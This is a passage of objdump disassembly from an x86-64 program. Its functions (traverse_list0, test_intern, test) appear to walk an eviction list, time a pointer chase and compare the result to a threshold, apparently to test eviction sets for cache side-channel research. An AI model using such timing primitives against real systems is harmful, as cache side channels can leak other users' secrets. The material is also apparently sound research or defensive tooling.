    32df:	e8 6c f3 ff ff       	call   2650 <my_access>
    32e4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    32e8:	48 8b 00             	mov    (%rax),%rax
    32eb:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    32ef:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    32f3:	48 8d 50 01          	lea    0x1(%rax),%rdx
    32f7:	48 89 55 f8          	mov    %rdx,-0x8(%rbp)
    32fb:	48 8b 15 1e 2e 00 00 	mov    0x2e1e(%rip),%rdx        # 6120 <conf>
    3302:	48 8b 12             	mov    (%rdx),%rdx
    3305:	48 39 d0             	cmp    %rdx,%rax
    3308:	72 cb                	jb     32d5 <traverse_list0+0x1e>
    330a:	90                   	nop
    330b:	90                   	nop
    330c:	c9                   	leave
    330d:	c3                   	ret

000000000000330e <test_intern>:
    330e:	55                   	push   %rbp
    330f:	48 89 e5             	mov    %rsp,%rbp
    3312:	53                   	push   %rbx
    3313:	48 83 ec 18          	sub    $0x18,%rsp
    3317:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    331b:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    331f:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    3323:	48 89 c7             	mov    %rax,%rdi
    3326:	e8 25 f3 ff ff       	call   2650 <my_access>
    332b:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    332f:	48 89 c7             	mov    %rax,%rdi
    3332:	e8 80 ff ff ff       	call   32b7 <traverse_list0>
    3337:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    333b:	48 05 de 00 00 00    	add    $0xde,%rax
    3341:	48 89 c7             	mov    %rax,%rdi
    3344:	e8 07 f3 ff ff       	call   2650 <my_access>
    3349:	48 8b 0d 08 2e 00 00 	mov    0x2e08(%rip),%rcx        # 6158 <msrmts>
    3350:	48 8b 05 f9 2d 00 00 	mov    0x2df9(%rip),%rax        # 6150 <msr_index>
    3357:	48 8d 50 01          	lea    0x1(%rax),%rdx
    335b:	48 89 15 ee 2d 00 00 	mov    %rdx,0x2dee(%rip)        # 6150 <msr_index>
    3362:	48 c1 e0 03          	shl    $0x3,%rax
    3366:	48 8d 1c 01          	lea    (%rcx,%rax,1),%rbx
    336a:	48 8b 45 e0          	mov    -0x20(%rbp),%rax
    336e:	be 01 00 00 00       	mov    $0x1,%esi
    3373:	48 89 c7             	mov    %rax,%rdi
    3376:	e8 f9 f2 ff ff       	call   2674 <probe_chase_loop>
    337b:	48 89 03             	mov    %rax,(%rbx)
    337e:	48 8d 05 8e 0e 00 00 	lea    0xe8e(%rip),%rax        # 4213 <_IO_stdin_used+0x213>
    3385:	48 89 c7             	mov    %rax,%rdi
    3388:	e8 b3 dc ff ff       	call   1040 <puts@plt>
    338d:	48 8b 05 c4 2d 00 00 	mov    0x2dc4(%rip),%rax        # 6158 <msrmts>
    3394:	48 8b 15 b5 2d 00 00 	mov    0x2db5(%rip),%rdx        # 6150 <msr_index>
    339b:	48 c1 e2 03          	shl    $0x3,%rdx
    339f:	48 83 ea 08          	sub    $0x8,%rdx
    33a3:	48 01 d0             	add    %rdx,%rax
    33a6:	48 8b 00             	mov    (%rax),%rax
    33a9:	48 8b 5d f8          	mov    -0x8(%rbp),%rbx
    33ad:	c9                   	leave
    33ae:	c3                   	ret

00000000000033af <test>:
    33af:	55                   	push   %rbp
    33b0:	48 89 e5             	mov    %rsp,%rbp
    33b3:	48 83 ec 10          	sub    $0x10,%rsp
    33b7:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
    33bb:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
    33bf:	48 83 7d f8 00       	cmpq   $0x0,-0x8(%rbp)
    33c4:	74 07                	je     33cd <test+0x1e>
    33c6:	48 83 7d f0 00       	cmpq   $0x0,-0x10(%rbp)
    33cb:	75 07                	jne    33d4 <test+0x25>
    33cd:	b8 00 00 00 00       	mov    $0x0,%eax
    33d2:	eb 36                	jmp    340a <test+0x5b>
    33d4:	48 8d 05 3f 0e 00 00 	lea    0xe3f(%rip),%rax        # 421a <_IO_stdin_used+0x21a>
    33db:	48 89 c7             	mov    %rax,%rdi
    33de:	e8 5d dc ff ff       	call   1040 <puts@plt>
    33e3:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
    33e7:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    33eb:	48 89 d6             	mov    %rdx,%rsi
    33ee:	48 89 c7             	mov    %rax,%rdi
    33f1:	e8 18 ff ff ff       	call   330e <test_intern>
    33f6:	48 8b 15 23 2d 00 00 	mov    0x2d23(%rip),%rdx        # 6120 <conf>
    33fd:	48 8b 52 18          	mov    0x18(%rdx),%rdx
    3401:	48 39 c2             	cmp    %rax,%rdx
    3404:	0f 92 c0             	setb   %al
    3407:	0f b6 c0             	movzbl %al,%eax
    340a:	c9                   	leave
    340b:	c3                   	ret

Disassembly of section .fini:

000000000000340c <_fini>:
    340c:	48 83 ec 08          	sub    $0x8,%rsp
    3410:	48 83 c4 08          	add    $0x8,%rsp
    3414:	c3                   	ret
